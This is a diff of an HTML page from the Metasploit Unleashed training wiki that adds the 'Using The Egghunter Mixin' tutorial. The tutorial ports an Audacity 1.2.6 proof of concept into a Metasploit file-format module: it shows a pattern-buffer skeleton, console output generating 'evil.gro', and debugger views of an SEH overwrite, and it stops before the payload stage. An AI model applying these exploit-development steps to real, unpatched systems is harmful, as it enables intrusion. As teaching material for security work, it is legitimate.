@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Using The Egghunter Mixin - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Using_The_Egghunter_Mixin" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Using_The_Egghunter_Mixin&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Using_The_Egghunter_Mixin&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Using_The_Egghunter_Mixin&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,260 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Using The Egghunter Mixin</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Using_The_Egghunter_Mixin#column-one">navigation</a>, <a href="Using_The_Egghunter_Mixin#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>The MSF egghunter mixin is a wonderful module which can be of great use in exploit development. If you're not familiar with the concepts of egghunters, read this.
+<br />
+<br />
+A vulnerability in the Audacity Audio Editor presents us with an opportunity to examine this mixin in greater depth. In the next module, we will exploit Audacity and create a Metasploit file format exploit module for it. We will not focus on the exploitation method itself or the theory behind it - but dive right into the practical usage of the Egghunter mixin.<br />
+<br />
+Please note, the following example uses Microsoft's Windows XP SP2 as it's target. If you wish to reproduce the following you'll need to setup your own VM. If SP2 is not available to you, SP3 can be used but make sure to disable DEP in the 'boot.ini' file using the following: /noexecute=AlwaysOff
+<br />
+Setting up Audacity<br />
+<br />
+</p>
+<dl><dd><ul><li>Download and install the vulnerable software on your XP SP2 box:
+</li></ul>
+<dl><dd><ul><li><a rel="nofollow" class="external text" href="http://www.exploit-db.com/wp-content/themes/exploit/applications/d59f24b86431eeb25281bce7817783f1-audacity-win-1.2.6.exe">Audacity 1.2.6</a>
+</li><li><a rel="nofollow" class="external text" href="http://www.offensive-security.com/w/archives/LADSPA_plugins-win-0.4.15.exe">LADSPA Plugins</a>
+</li></ul>
+</dd></dl>
+<ul><li>Download and examine the original POC, taken from&#160;: <a rel="nofollow" class="external free" href="http://www.exploit-db.com/exploits/7634/">http://www.exploit-db.com/exploits/7634/</a>
+</li></ul>
+</dd></dl>
+<p><br />
+</p>
+<h4> <span class="mw-headline" id="Porting_the_PoC">Porting the PoC</span></h4>
+<p>Let's port this POC to an MSF file format exploit module. We can use an existing module to get a general template. The zinfaudioplayer221_pls.rb exploit provides us with a good start.
+<br />
+<br />
+Our skeleton exploit should look similar to this. Notice our buffer being generated here:
+<br />
+<pre> def exploit
+    buff = Rex::Text.pattern_create(2000)
+    print_status("Creating '#{datastore['FILENAME']}' file ...")
+    file_create(buff)
+ end</pre>
+<br />
+We use Rex::Text.pattern_create(2000) to create a unique string of 2000 bytes in order to be able to track buffer locations in the debugger.
+<br />
+<br />
+Once we have the POC ported, we generate the exploit file and transfer it to our Windows box. Use the generic/debug_trap payloads to begin with.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>audacity</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+Name       Current Setting Required Description
+----       --------------- -------- -----------
+FILENAME   evil.gro        yes      The file name.
+OUTPUTPATH /var/www        yes      The location of the file.
+
+
+Payload options (generic/debug_trap):
+
+Name Current Setting Required Description
+---- --------------- -------- -----------
+
+
+Exploit target:
+
+Id Name
+-- ----
+0 Audacity Universal 1.2
+
+
+msf exploit(<span style='color:#ff0000;'>audacity</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Creating 'evil.gro' file ...
+<span style='color:#0000FF;'>[*]</span> Generated output file /var/www/evil.gro
+<span style='color:#0000FF;'>[*]</span> Exploit completed, but no session was created.
+msf exploit(<span style='color:#ff0000;'>audacity</span>) ></pre>
+<br />
+We open Audacity, attach a debugger to it and import the MIDI gro file.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<div class="center"><div class="floatnone"><a href="File:Pre-attach-00.png" class="image"><img alt="Pre-attach-00.png" src="http://www.offensive-security.com/w/images/e/e6/Pre-attach-00.png" width="527" height="383" /></a></div></div>
 <p><br />
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
+We immediately get an exception from Audacity, and the debugger pauses:
 <br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:Attach-00.png" class="image"><img alt="Attach-00.png" src="http://www.offensive-security.com/w/images/8/81/Attach-00.png" width="601" height="480" /></a></div></div>
+<p><br />
+<br />
+A quick look at the SEH chain shows that we have overwritten an exception handler.
+<br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:Aud-seh-00.png" class="image"><img alt="Aud-seh-00.png" src="http://www.offensive-security.com/w/images/c/c9/Aud-seh-00.png" width="269" height="174" /></a></div></div>
+<p><br />
+<br />
+We take the exception (shift + F9), and see the following:
+<br />
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:Aud-seh-01.png" class="image"><img alt="Aud-seh-01.png" src="http://www.offensive-security.com/w/images/6/68/Aud-seh-01.png" width="601" height="479" /></a></div></div>
+<p><br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Exploit_Development" title="Exploit Development">Exploit Development</a> &gt; Using The Egghunter Mixin</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Exploit_Design_Goals" title="Exploit Design Goals">Exploit Design Goals</a> &#124; <a href="Exploit_Format" title="Exploit Format">Exploit Format</a> &#124; <a href="Exploit_Mixins" title="Exploit Mixins">Exploit Mixins</a> &#124; <a href="Exploit_Targets" title="Exploit Targets">Exploit Targets</a> &#124; <a href="Exploit_Payloads" title="Exploit Payloads">Exploit Payloads</a> &#124; <a href="Writing_An_Exploit" title="Writing An Exploit">Writing An Exploit</a> &#124; <strong class="selflink">Using The Egghunter Mixin</strong> &#124; <a href="Porting_Exploits" title="Porting Exploits">Porting Exploits</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total3"><a href="Completing_The_Exploit" title="Completing The Exploit">Completing The Exploit</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 521/1000000
+Preprocessor generated node count: 2665/1000000
+Post‐expand include size: 4900/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:48-0!*!0!*!*!2!* and timestamp 20131124115129 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Using_The_Egghunter_Mixin&amp;oldid=1314">http://www.offensive-security.com/w/index.php?title=Using_The_Egghunter_Mixin&amp;oldid=1314</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Exploit_Development&amp;action=edit&amp;redlink=1" class="new" title="Category:Exploit Development (page does not exist)">Exploit Development</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +745,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.129 secs. --></body></html>
